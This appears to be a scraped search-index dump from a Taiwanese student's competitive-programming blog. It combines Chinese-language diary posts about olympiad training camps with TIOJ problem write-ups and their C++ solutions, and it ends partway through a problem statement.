總之防疫公假結束之後就無縫接軌二階\n因為師大有確診所以我們原本應該是要待在家裡邊防疫邊線上上課\n我們的住宿和披薩全都因為疫情泡湯QAQ，變成線上授課\n啊我們上課就不是重點喔@@我覺得能夠不管任何外部事務，只專心互相討論題目、或者耍廢才是我心目中(?)的選訓營QQ\n非新北、台北的學生可以有一晚的住宿，我好想要飯店早餐(\n既然我們都覺得教授上的課不是重點，能夠和其他電神互相討論才是選訓營最大的好處\u0026gt;\u0026lt;\n於是我們建中一群人就借用了電教和創客教室來討論(?)\n有些南部人待在台北的也跟著來ㄌ，這一團變得超熱鬧\n捯捯捯捯捯捯捯 AY跑去新竹跟東東和balbit刷題的樣子，第二個禮拜double學長也跑下去\n模考的時候他們再跑上來\n總之我們好像每次模考就會吃一兩次拉麵XD好爽\n課程 在二階上的有些課很奇怪，比如說什麼KMP和SA，或者建凸包求面積之類的\n雖然從北市賽到入營考考的字串題好像只有AC自動機那題，可是在二階教這些超奇怪的吧XD\n有一堂課是教授會丟題目給我們寫，給一個很大的測資然後要我們找出答案之類的\n去年似乎是舉手讓教授看，不過今年是用google meet，答案直接打在聊天室，沒有避嫌超奇怪啦\n雖然是教分治的教授，不過有丟了一些有趣的DP題目\n這次也聽到了Level Ancestor的做法，Ladder Algorithm好神奇喔\n不過RMQ的O(N)O(1)也聽了好幾遍，已經聽膩了\n國手們來講課的時候AY好像弄了一個DC的bot，於是我們後面就開始duel\n休閒娛樂 什麼是duel呢?\n就是讓bot選一題然後兩個人比誰先想出來然後AC XD\n我好像沒有duel的太積極ww不過AY和balbit似乎超常對決\n不知道從誰開始玩BTD battles的，我們幾乎每天都玩(到二階結束還在玩)\n03t教的策略超強，可是我還是常常玩到破產，只能打五元的，超可憐又一直遇到金錢幾百萬的對手，怎麼贏?\n另外因為沒有被關在師大，吃飯就成了一個問題\n我們除了在建中的熱食部吃以外，也去吃了好幾家拉麵，有點罪惡感XD\n啊也因為沒有被關在師大，我就可以順理成章的在晚上去打音遊，真爽(現在sdvx中毒中:P)\n模考 模考在師大本部舉行，地點是一個會議室(汗)\n而且跟全國賽一樣是用筆電，不過這次升級成電競筆電了(不如把預算拿去幫我們弄住宿或上課空間QQ)\n三模難度超高QQ，本來以為自己被電爆不過似乎拿到最高分，因為拿到一題FWT的56分@@可惜我沒拿滿\n剩下pCpD幾乎沒人拿到分數，超可怕\n我pA沒有把手做的分數拿滿有點可惜(?)\n四模的話，pA看起來是可以做的題目(幸好進位制不是負的)，花了一些時間丟上去部分分確定是對的之後優化個兩三次就AC了\n剩下的題目都做不出來QQ原本以為pB是可以做的DP但是出來好像大家都不會\npC沒有拿滿很可惜，pD也是和大家一樣沒想法不過可惜我沒去拿一條鏈的case\n接下來? 因為我在學校嘗試待了一個禮拜之後發現真的待不太下去(這就是奧林匹亞回歸症候群嗎\u0026hellip;)\n於是成功的用準備資奧的理由請了假，罪惡感爆棚呢XD\n現在該做的事可能就是編講義、寫題解吧，希望自己不要頹廢OvO\n","permalink":"https://omeletwithoutegg.github.io/2020/05/07/TOI-2/","tags":["experience","TOI"],"title":"TOI-2!"},{"contents":"B.魔術數字 https://tioj.ck.tp.edu.tw/problems/1039\nDescription 超級長orz\n總之名次的比較是看勝率，勝率的定義是「勝場數/(勝場數+敗場數)」\n而兩隊魔術數字$M$的定義如下：\n假設A隊的勝率領先B隊，只要A隊再贏除了B隊以外的隊伍$M$場，就算$B$隊剩下的所有場次都贏也不能得到和A相等的勝率\n假設$M$大於A隊對上除了B隊以外的隊伍剩下的場次，那我們說A隊對B隊的魔術數字尚未點亮\n否則我們說A隊對B隊的魔術數字是$M$\n如果$M$歸零的話，表示A隊不管怎麼樣名次都會超過B隊\n對於每一筆測試資料，請輸出一排版過的戰績表。依n支球隊的戰績排名順序輸出n行。除了第1名球隊以外，若發生勝率相同的情形，請依球隊在原資料的出現順序為輸出順序，但其排名則應並列。格式請參考範例輸出。隊名，勝率，魔術數字分別以一個空格來間隔，而隊名部分不足9個字元的部分則需填入空格。勝率固定輸出到小數點後三位(四捨五入)。第一名球隊不需要輸出魔術數字，請你分別計算出第一名球隊對其他球隊的魔術數字。若對其他球隊的魔術數字尚未點亮，請輸出--。若魔術數字已點亮，則輸出M以及該數字。測試資料之間請留一個空行。\nSolution 呃\u0026hellip;就是一大堆噁心輸出\n注意勝率的定義不包括和局QQ\n計算魔術數字的方法就是用while迴圈一直加，跑到在題敘指定的情況下A隊的勝率會大於B隊的勝率\n噢名次的地方也是要注意QQ很容易沒注意就寫錯\n還有他的空行是在測試資料之間(?)雖然我不知道有沒有差啦\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include \u0026lt;cstdio\u0026gt; #include \u0026lt;cmath\u0026gt; #include \u0026lt;algorithm\u0026gt; struct Team { char name[10]; int W, T, L, id; double rate; friend bool operator\u0026lt;(const Team \u0026amp;a, const Team \u0026amp;b) { return a.rate != b.rate ? a.rate \u0026gt; b.rate : a.id \u0026lt; b.id; } } t[100]; int rest[100][100]; signed main() { int n, g; bool first = true; while(scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;g), n || g) { if(!first) puts(\u0026#34;\u0026#34;); first = false; for(int i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%s%d%d%d\u0026#34;, t[i].name, \u0026amp;t[i].W, \u0026amp;t[i].T, \u0026amp;t[i].L); t[i].id = i; t[i].rate = t[i].W / double(t[i].W+t[i].L); } for(int i = 0; i \u0026lt; n; i++) for(int j = 0; j \u0026lt; n; j++) scanf(\u0026#34;%d\u0026#34;, \u0026amp;rest[i][j]); std::sort(t, t+n); int rk = 0; double last = 7122; for(int i = 0; i \u0026lt; n; i++) { if(t[i].rate != last) rk = i+1; last = t[i].rate; printf(\u0026#34;%d:%-9s %.3f\u0026#34;, rk, t[i].name, round(t[i].rate * 1000) / 1000); if(i) { int magic = 0; while((t[0].W + magic) / double(g - t[0].T) \u0026lt;= (g - t[i].T - t[i].L) / double(g - t[i].T)) ++magic; if(magic \u0026lt;= g - (t[0].W+t[0].T+t[0].L) - rest[t[0].id][t[i].id]) printf(\u0026#34; M%d\u0026#34;, magic); else printf(\u0026#34; --\u0026#34;); } puts(\u0026#34;\u0026#34;); } } } ","permalink":"https://omeletwithoutegg.github.io/2020/05/06/TIOJ-1039/","tags":["TIOJ"],"title":"TIOJ-1039"},{"contents":"照亮的山景 https://tioj.ck.tp.edu.tw/problems/1404\nDescription 在一片山的上空，高度為$T$處有$N$個處於不同水平位置的燈泡，如上圖所示。\n如果山的邊界上某一點與第$i$盞燈的連線不經過任何山稜線上的一點，我們稱第$i$盞燈可以照亮該點。\n請問在所有$M$盞燈中，至少要打開幾盞燈，才能照亮山上每一個轉折點，或者打開所有的燈也無法照亮所有轉折點？\n$1 \\leq M, N \\leq 10^5$\n所有座標的絕對值小於$10^5$\nSolution 發現到每個燈泡可以照到的範圍可能會長的非常奇怪\n於是我們轉換思維，考慮每個轉折點如果要被照到要有什麼條件\n可以發現，對於每個轉折點來說有一個區間，只要區間內有一個燈泡有開，這個轉折點就會被照到\n找出那些區間之後這題就是經典的greedy題目了（按照右界由小到大，有拿過的跳過沒拿過的拿右界那個點）\n那麼要怎麼找出這些區間呢？某個轉折點$p_i$對應的右界，正好是他和他右邊所有其他點所連出的射線中斜率最大者\n維護一個上凸包能夠找到對應的那個點，再用直線求交點公式找出高度恰好是$T$的位置就好\n左界也是同樣方式處理\n因為題目給定的點已經幫我們排序好了，所以做凸包是$\\mathcal{O}(M)$，而greedy的部分也可以做到$\\mathcal{O}(N)$不過我這邊是放了$\\mathcal{O}(N\\log N)$的，因為找到交點之後必須二分搜求出到底涵蓋了哪些燈泡\n總複雜度是$\\mathcal{O}((M+N)\\log N)$\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 #include \u0026lt;bits/stdc++.h\u0026gt; #define debug(x) cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;x\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39; using namespace std; const int N = 100025; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int m, n, T; while(cin \u0026gt;\u0026gt; m) { vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; v(m); for(auto \u0026amp;[x, y]: v) cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; T; vector\u0026lt;int\u0026gt; bulb(n); for(int \u0026amp;x: bulb) cin \u0026gt;\u0026gt; x; vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; seg(m, pair\u0026lt;int,int\u0026gt;(0, n)); { auto better = [](pair\u0026lt;int,int\u0026gt; a, pair\u0026lt;int,int\u0026gt; b, pair\u0026lt;int,int\u0026gt; c) { pair\u0026lt;int,int\u0026gt; AB(b.first-a.first, b.second-a.second); pair\u0026lt;int,int\u0026gt; BC(c.first-b.first, c.second-b.second); return 1LL * AB.first * BC.second - 1LL * BC.first * AB.second \u0026gt; 0; }; vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; stk; for(int i = 0; i \u0026lt; m; i++) { while(stk.size() \u0026gt;= 2 \u0026amp;\u0026amp; better(stk[stk.size()-2], stk[stk.size()-1], v[i])) stk.pop_back(); if(stk.size() \u0026amp;\u0026amp; stk.back().second \u0026gt; v[i].second) { double x = v[i].first + (T - v[i].second) * (stk.back().first - v[i].first) / double(stk.back().second - v[i].second); seg[i].first = upper_bound(bulb.begin(), bulb.end(), x) - bulb.begin(); } stk.push_back(v[i]); } } { auto better = [](pair\u0026lt;int,int\u0026gt; a, pair\u0026lt;int,int\u0026gt; b, pair\u0026lt;int,int\u0026gt; c) { pair\u0026lt;int,int\u0026gt; AB(b.first-a.first, b.second-a.second); pair\u0026lt;int,int\u0026gt; BC(c.first-b.first, c.second-b.second); return 1LL * AB.first * BC.second - 1LL * BC.first * AB.second \u0026lt; 0; }; vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; stk; for(int i = m-1; i \u0026gt;= 0; i--) { while(stk.size() \u0026gt;= 2 \u0026amp;\u0026amp; better(stk[stk.size()-2], stk[stk.size()-1], v[i])) stk.pop_back(); if(stk.size() \u0026amp;\u0026amp; stk.back().second \u0026gt; v[i].second) { double x = v[i].first + (T - v[i].second) * (stk.back().first - v[i].first) / double(stk.back().second - v[i].second); seg[i].second = lower_bound(bulb.begin(), bulb.end(), x) - bulb.begin(); } stk.push_back(v[i]); } } bool ok = true; for(int i = 0; i \u0026lt; m; i++) if(seg[i].first == seg[i].second) { cout \u0026lt;\u0026lt; \u0026#34;you need more bulbs!\\n\u0026#34;; ok = false; break; } if(!ok) continue; sort(seg.begin(), seg.end(), [](pair\u0026lt;int,int\u0026gt; a, pair\u0026lt;int,int\u0026gt; b){return a.second \u0026lt; b.second;}); int last = -1, ans = 0; for(auto [l, r]: seg) { if(l \u0026gt;= last) { last = r; ++ans; } } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } ","permalink":"https://omeletwithoutegg.github.io/2020/05/04/TIOJ-1404/","tags":["TIOJ","geometry","greedy"],"title":"TIOJ-1404"},{"contents":"組合布丁 https://tioj.ck.tp.edu.tw/problems/1628\nDescription 記得在快樂暑假營開始前，你曾經說過：「只要我有一次比賽沒有破台，就要請全快樂營的人吃布丁。」\n好吧，蚯蚓太威了，你終究是沒有破台。\n根據小道消息，你得知了這次的快樂暑假營總共有 $n$ 個人報名，\n但是實際上會出席的只有 $k$ 個人，因此你只要請 $k$ 個人吃布丁就好。\n而報名的第 $i$ 個人只會願意吃 $t_i$ 口味的布丁(用一個 int 範圍內的整數表示)。\n假設你不確定究竟誰會出席，那有幾種不同的布丁組合可能會出現在你的採買清單上 ?\n喔對了，因為答案可能太大了，所以你決定只要知道答案除以 $M$ 的餘數就好。\n輸入包含多筆測資\n$$\n1 \\leq n, k \\leq 5000, 1 \\leq M \u0026lt; 2^{31}\n$$\nSolution 兩種布丁組合不同，若且唯若某一種布丁的數量不同\n因此我們枚舉每個布丁的數量去做計數背包就好了\n可以用前綴和甚至FFT加速(?)不過FFT應該不會比較快www\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int t[5025], n, k, M; long long dp[5025]; void go(int maxcnt) { for(int i = k; i \u0026gt;= 0; i--) { long long sum = 0; for(int j = 0; j \u0026lt;= i \u0026amp;\u0026amp; j \u0026lt;= maxcnt; j++) { sum = (sum + dp[i-j])%M; } dp[i] = sum; } } signed main() { while(cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; k \u0026gt;\u0026gt; M) { dp[0] = 1; for(int i = 1; i \u0026lt;= k; i++) dp[i] = 0; for(int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; t[i]; sort(t,t+n); for(int i = 0, j; i \u0026lt; n; i = j) { for(j = i; j \u0026lt; n; j++) if(t[i] != t[j]) break; go(j-i); } cout \u0026lt;\u0026lt; dp[k] \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } ","permalink":"https://omeletwithoutegg.github.io/2020/05/03/TIOJ-1628/","tags":["TIOJ","dp"],"title":"TIOJ-1628"},{"contents":"蘿莉切割問題 https://tioj.ck.tp.edu.tw/problems/1861\nDescription 請你把一個數字$L$切成$a_1, a_2, \\dots, a_n$\n切一個數字$x$的代價是$x$，可以把它切成$b, x-b$兩個數字\n找出最小的代價\nSolution 霍夫曼編碼XD老題目\n把切割的過程看成一個二元樹，每個$a_i$都代表一個葉子\n其餘的節點代表合併中會出現的數字(?)\n那麼總代價就是所有葉子的權重乘上各自的深度的和\n我們想要讓這個代價越小越好\n可以發現，在最優解$T$中：\n沒有節點只有一個兒子，只要不是葉子的節點都恰好有兩個子節點 深度最大的那層節點一定是權重最小的，否則可以直接交換得到更優解 由上面兩點可以發現，權重最小的兩個節點一定都在最深的那一層\n並且可以在不影響代價的情況下交換節點使得最小的兩個節點互為兄弟\n結論是：每次把最小和次小的節點合併成一個節點，一定可以得到最佳解\n(QQ我覺得我不會查也不會寫證明)\n要怎麼維護所有節點的最小和次小呢？用一個heap就可以啦\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 100025; #define int ll int v[N]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n,ans; while(cin \u0026gt;\u0026gt; n) { ans = 0; for(int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; v[i]; std::priority_queue\u0026lt;int,vector\u0026lt;int\u0026gt;,greater\u0026lt;int\u0026gt;\u0026gt; pq(v,v+n); while(pq.size() \u0026gt; 1) { int x = pq.top(); pq.pop(); int y = pq.top(); pq.pop(); ans += (x+y); pq.push(x+y); } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } ","permalink":"https://omeletwithoutegg.github.io/2020/05/01/TIOJ-1861/","tags":["TIOJ","greedy"],"title":"TIOJ-1861"},{"contents":"選訓生活(?) 最近部落格停更好久喔\u0026gt;\u0026lt;\n不知道有沒有沒有追蹤我facebook的人在看我的部落格，嘻嘻\n入營考當天? 我和蕭梓宏還有王品翔一起去師大看好戲(X)\n然後電石似乎在旁邊寫作業和嘴砲(?)\n不過記分板上沒有每個人的名字，只有學校和編號\n幸好遇到一個奇怪的家長有拍名單之類的XD 讓我們能夠對照\n最後結果是AY破台拿第一，除了03t以外的建中高二應該都進了一階\n我們之後分團去ㄘ了拉麵！\n一階 懷著新奇的心情來到這個地方，報到時我好像是蠻晚進去的幾個(因為林哲宇帶路)\n一開始我本來想說可以打osu，因為去年似乎好多人那樣刷時間?\n不過晚上看到好多人在刷題，我超怕www\n於是就開始寫不知道甚麼題目\n課程 有幾堂是教授講課，首先是入營考的題解，不過好像被發現有一題假解XDD\n之後有一個是張經略教授，他會在白板上畫加菲貓而且上課超級high(他自嗨功力很高)\n有一堂課是國手經驗分享，bert和minson說了好多奇怪的趣聞(?)\n第一個禮拜幾乎所有人都出現了(?) BB、電石、吳聖福、王彥仁好幾位都有來講題目or分享奇怪心得\n從一模隔天開始，剩下的教授幾乎都是線上上課，所以我後來幾乎沒有在上課QQ\nO(N)O(1)RMQ 教了幾百遍聽到不想再聽(X)\n教室似乎因為防疫的關係換了三次左右，有點煩躁\n第一個禮拜我刷的比較多應該還是TIOJ，畢竟我還是覺得我刷不動POI(?)\n不過第二個禮拜開始刷一些BOI，想說練一下喇分能力\n可是不知道是題目問題還是我的個性幾乎不是直接想到滿分解就是只有不到三十的部分分QQ\nPOI和JOI仍然還在我的實力的很上方\n話說一模附近幾天剛好是JOISC，不過難到炸，我完全寫不出啥\n飲食住宿 我們的飯店是台大捷絲旅，對面就是哈拉星球XDD，可惜沒有辦法去打QQ\n然後我的室友是暘典，好像有點自然的就稍微變熟不過還是很不熟(?)\n早餐是飯店的早餐，這十四天每天早上吃這個真的超級爽耶，我超愛炒蛋和炸的東西\n午餐和晚餐在師大的學餐吃，我覺得中餐真的就是該吃早餐部XD\njoy一直推薦西西里雞腿堡加蛋加起司，不過我覺得沒有傳言那麼好吃\n晚餐就只剩西餐廳跟自助餐兩個選，我覺得西餐廳的拉麵超級糟糕，丼飯也只是勉強能吃ww\n自助餐則是超級尷尬的選擇，不好吃也不難吃，不過很容易就超過預算90元要自掏腰包www\n在吃飯的時候基本上都會打牌，因為這似乎是無聊的選訓生活中少數的消遣(?) (雖然我現在覺得選訓一點都不無聊QQ)\n最常打的是拿破崙，ericxiao真的大師，啊seanliu到第二個禮拜才發現他知道的比牌大小規則是錯的XD超好笑\n此外因為那時候mini metro限免，大家一窩蜂去下載來玩\n吃完飯之後我幾乎都會買微舒打，好爽喔\n在飯店，有時候晚上會和祺他人在其他房玩狼人殺或打拿破崙之類的(?)\n有時也會有淇怪的人來我們房間玩(?)\n每天晚上點名的時候有零食和飲料，算是填填牙縫(\n晚上沒什麼消遣，除了打牌玩狼人殺，或者打code以外，也可以跟人聊天 \u0026lt;3\n模考 如同國手們分享經驗時所說的，我覺得我正好就是那些在北市賽、全國賽也許表現得好，但是是第一次模考的菜雞\n他們提到說賽中要多喝水、多上廁所，也要記得補充血糖，轉換轉換心情並讓大腦保持清醒\n其實這些我在500days那本書就看過了好幾次，不過我還是當作重要的一些策略記著\n一模的時候我雖然打得很差，可是我沒有想到什麼特別的原因讓我打爛，單純只是我都沒有想法而已\n因為還沒踏進棺材所以晚上也不是特別難過，不過看到打得比我好的說什麼我很強就覺得超級不爽= =想打人(例如joy)\n看到別人分數比自己高還是會超級羨慕的吧\n二模因為pC出一大堆問題所以大家好像都打得很爛，不過我pC是最後才碰的所以幸運沒有踩雷\n而且還是因為pD測資爛撈到一個AC= =現在回去看每一場都有憐憫我的分數\n模考的難度聽說比以往難，然後我實際寫也是感覺真的很難(雖然我沒去過以前的)，可能跟一些div 1的場次一樣吧?\n不過撈部分分的能力應該才是真正決勝的地方，有請品翔喇分大師分享入營考0AC的經驗\n列舉事項 因為一階遇到很多酷哥，所以我要從facebook抄過來那段列舉\n幾件神奇的事情：\nthomaswang和ericxiao分別站在爛梗光譜的兩端 西餐廳的拉麵超糟 午餐吃早餐部唯一真理吧 天天喝微舒打好爽 吃飯店的早餐有夠爽 晚餐或晚上超常打拿破崙 seanliu打了兩個禮拜竟然有規則不知道 然後蕭電超強 YoJaHuang\u0026amp;品翔歌神了吧 實中的人都超酷 除了tommydong比較正常一點 仲群病毒大家都一直學www 「我燒雞」 「呃 我弱」 casperwang洗澡專家 不過還是教不會品翔 好多東西都是第一次接觸到 例如十二人狼人殺或是學生餐廳的點餐方法www 待續\u0026hellip; 因為打這篇的時候我在學校努力上課(?) 所以打得斷斷續續的，一階結束之後的事放到下一篇打好了\n待在學校真的好可怕，所謂奧林匹亞回歸症候群就是這樣嗎QQ\n英文國文化學物理一直打瞌睡，然後我也不敢(或懶得)要之前沒拿的講義，完美詮釋社交障礙\n問了一些學長，明天問問看特教組申請推薦的方法和能不能請公假好了\n我要跑去看FF7實況了，TIFA真香\n","permalink":"https://omeletwithoutegg.github.io/2020/04/30/TOI-1/","tags":["experience","TOI"],"title":"TOI-1!"},{"contents":"快樂規劃路徑 https://tioj.ck.tp.edu.tw/problems/1629\nDescription 樹朋友們生活在一個湖邊，湖邊的樹依照順時針方向編號為$1, 2, \\dots n$。\n他們想要讓自己更快樂，所以發明了一種娛樂方式，就是找到一條路徑遍歷全部$n$棵樹剛好一遍。\n要從A樹到B樹唯一的方法就是架一條很長的梯子直直伸過去。\n可是當然不是任何兩棵樹都可以架梯子，所以他們會先把所有可能架梯子的樹對(沒有錯字!)給你。\n當然，(A,B)表示A可以到B、B也可以到A。\n但是給定的遊歷路徑不能出現任兩條梯子交叉，不然可能會讓想要快樂的樹朋友發生危險。\n例如上圖粗線所示就是一個合法的快樂路徑。\n給你樹的個數以及樹對，請輸出一組快樂路徑。\n若有很多組解，樹朋友希望看到字典順序最小的那一組。\n$5 \\leq n \\leq 1000$\nSolution 由不能交叉的條件可以推出，在某個時刻已經遍歷過的點一定是環上的一個連續區間\n所以可以2D/0D的區間DP，並記錄最小的轉移來源\n我的dp$[i][L][0]$代表的是現在站在$i$，往順時鐘方向的$L$個都已經遍歷過了，$dp[i][L][1]$也相似只是換成逆時鐘\n因為實在想不到更好的實作方式所以寫的有夠醜，但是只要好好選到最小的轉移來源就會是字典序最小的路徑了\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 1025; int n, m; bool dp[N][N][2], fr[N][N][2], g[N][N]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for(int i = 0; i \u0026lt; m; i++) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b, --a, --b; g[a][b] = g[b][a] = true; } for(int i = 0; i \u0026lt; n; i++) dp[i][1][0] = dp[i][1][1] = true; for(int L = 2; L \u0026lt;= n; L++) for(int i = 0; i \u0026lt; n; i++) { // dp[i][L][0] if(dp[(i+1)%n][L-1][0] \u0026amp;\u0026amp; g[(i+1)%n][i]) { // (i+1)%n fr[i][L][0] = 0; dp[i][L][0] = true; } if(dp[(i+L-1)%n][L-1][1] \u0026amp;\u0026amp; g[(i+L-1)%n][i]) { // (i+L-1)%n if(!dp[i][L][0] || (i+1)%n \u0026gt; (i+L-1)%n) fr[i][L][0] = 1; dp[i][L][0] = true; } // dp[i][L][1] if(dp[(i+n-1)%n][L-1][1] \u0026amp;\u0026amp; g[(i+n-1)%n][i]) { // (i+n-1)%n fr[i][L][1] = 0; dp[i][L][1] = true; } if(dp[(i+n+1-L)%n][L-1][0] \u0026amp;\u0026amp; g[(i+n+1-L)%n][i]) { // (i+n+1-L)%n if(!dp[i][L][1] || (i+n-1)%n \u0026gt; (i+n+1-L)%n) fr[i][L][1] = 1; dp[i][L][1] = true; } } for(int i = 0; i \u0026lt; n; i++) { if(dp[i][n][0] || dp[i][n][1]) { vector\u0026lt;int\u0026gt; ans; for(int c = 0; c \u0026lt; 2; c++) if(dp[i][n][c]) { int d = c; vector\u0026lt;int\u0026gt; vv; for(int L = n; L \u0026gt;= 1; L--) { vv.push_back(i); // cerr\u0026lt;\u0026lt;dp[i][L][d]\u0026lt;\u0026lt;\u0026#39;,\u0026#39;; int f = fr[i][L][d]; if(d) { if(f) { i = (i+n+1-L)%n; d = 0; }else { i = (i+n-1)%n; d = 1; } }else { if(f) { i = (i+L-1)%n; d = 1; }else { i = (i+1)%n; d = 0; } } } if(ans.empty() || vv \u0026lt; ans) ans = vv; } for(int x: ans) cout \u0026lt;\u0026lt; x+1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return 0; } } cout \u0026lt;\u0026lt; -1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2020/02/29/TIOJ-1629/","tags":["TIOJ","IOI"],"title":"TIOJ-1629"},{"contents":"Assssss!! https://tioj.ck.tp.edu.tw/problems/1505\nDescription 現在有一個正整數構成的除法數列\n$\nx_1 / x_2 / x_3 / \\dots / x_n\n$\n請問是否有一種加上括號的方法使得最後運算的結果是整數?\n$2 \\leq n \\leq 10^5, 1 \\leq x_i \\leq 10^9$\nSolution 加上括號之後每個數字會被放到分母或分子，想當然而放在分子的數字越多越好\n可以發現$x_2$會恰好被放到分母一次，因此在最後他一定是當分母的\n而我們可以構造出一個方法讓除了$x_2$最後當分母以外，其他數字都當分子\n$$\n(x_1 / (((x_2 / x_3) / x_4) / x_5 \\dots)) = \\frac{x_1 x_3 x_4 x_5 \\dots x_n}{x_2}\n$$\n由於$x_2$最後一定會待在分母，只要檢查其他數字的乘積是否可以被$x_2$整除就好了\n記得 long long 的問題\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;cstdio\u0026gt; inline char readchar() { constexpr int B = 1\u0026lt;\u0026lt;20; static char buf[B], *p, *q; if(p == q \u0026amp;\u0026amp; (q=(p=buf)+fread(buf,1,B,stdin)) == buf) return EOF; return *p++; } inline int nextint() { int x = 0, c = readchar(); while(c \u0026lt; \u0026#39;0\u0026#39;) c = readchar(); while(c \u0026gt;= \u0026#39;0\u0026#39;) x=x*10+(c^\u0026#39;0\u0026#39;), c=readchar(); return x; } signed main() { int t = nextint(); while(t--) { int n = nextint(); int res = nextint(), mod = nextint(); for(int i = 2; i \u0026lt; n; i++) res = 1LL * res * nextint() % mod; puts(res ? \u0026#34;zzz...\u0026#34; : \u0026#34;Asssss!!\u0026#34;); } } ","permalink":"https://omeletwithoutegg.github.io/2020/02/27/TIOJ-1505/","tags":["TIOJ","math"],"title":"TIOJ-1505"},{"contents":"發糖果囉 https://tioj.ck.tp.edu.tw/problems/1219\nDescription 求符合$1 \\leq x \\leq n, 1 \\leq y \\leq m$且$x,y$的最大公因數是$g$的數對有多少對\n有多筆測試資料，$1 \\leq n, m, g \\leq 50000$\nSolution 莫比烏斯反演\nlemma $$\n\\sum_d \\mu(d) [d | x] = [x = 1]\n$$\n拿來簡化 $[\\gcd(i,j)=1]$ 的部分，再想辦法換一下$\\sum$的位置\n$$\n\\begin{align*}\n\\sum _ {i=1}^n \\sum _ {j=1}^m [\\gcd(i, j) = g] \u0026amp;= \\sum _ {i=1}^{\\lfloor n/g \\rfloor} \\sum _ {j=1}^{\\lfloor m/g \\rfloor} [\\gcd(i, j) = 1]\\newline\n\\sum _ {i=1}^N \\sum _ {j=1}^M [\\gcd(i, j) = 1] \u0026amp;= \\sum _ {i=1}^N \\sum _ {j=1}^M \\sum_d \\mu(d) \\cdot [d | \\gcd(i, j)]\\newline\n\u0026amp;= \\sum_d \\mu(d) \\sum _ {i=1}^N \\sum _ {j=1}^M [d | \\gcd(i, j)]\\newline\n\u0026amp;= \\sum_d \\mu(d) {\\lfloor \\frac{N}{d} \\rfloor} {\\lfloor \\frac{M}{d} \\rfloor}\n\\end{align*}\n$$\n預處理$\\mu$的前綴，利用數論分塊可以做到$\\mathcal{O}(N + Q \\sqrt{N})$\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026lt;cstdio\u0026gt; #include \u0026lt;vector\u0026gt; const int N = 50025; bool sv[N]; int mu[N], smu[N]; std::vector\u0026lt;int\u0026gt; prs; inline int min(int a, int b) {return a\u0026lt;b?a:b;} signed main() { mu[1] = 1; for(int i = 2; i \u0026lt; N; i++) { if(!sv[i]) prs.emplace_back(i), mu[i] = -1; for(int p: prs) { if(i*p \u0026gt;= N) break; sv[i*p] = true; if(i%p) { mu[i*p] = -mu[i]; }else { mu[i*p] = 0; break; } } } for(int i = 1; i \u0026lt; N; i++) smu[i] = smu[i-1]+mu[i]; int n, m, g; while(scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;n, \u0026amp;m, \u0026amp;g), n || m || g) { n /= g, m /= g; long long ans = 0; for(int i = 1, j; i \u0026lt;= n \u0026amp;\u0026amp; i \u0026lt;= m; i = j) { j = min(n/(n/i), m/(m/i))+1; ans += 1LL * (smu[j-1] - smu[i-1]) * (n/i) * (m/i); } printf(\u0026#34;%lld\\n\u0026#34;, ans); } } ","permalink":"https://omeletwithoutegg.github.io/2020/02/25/TIOJ-1219/","tags":["TIOJ","math"],"title":"TIOJ-1219"},{"contents":"殿壬愛序列 https://tioj.ck.tp.edu.tw/problems/2140\nDescription 給你一個長度為$N$的序列$a_1, a_2, \\dots, a_N$，並且依序執行$Q$個操作，每個操作可能是\n1 x y ：把$a_x$設成$y$\n2 L R k ：對於每個$i \\in [L, R]$，把$a_i$設成$\\lfloor \\frac{a_i}{k} \\rfloor$。其中$\\lfloor x \\rfloor$代表不大於$x$的最大整數\n3 L R ：請輸出$a_L, a 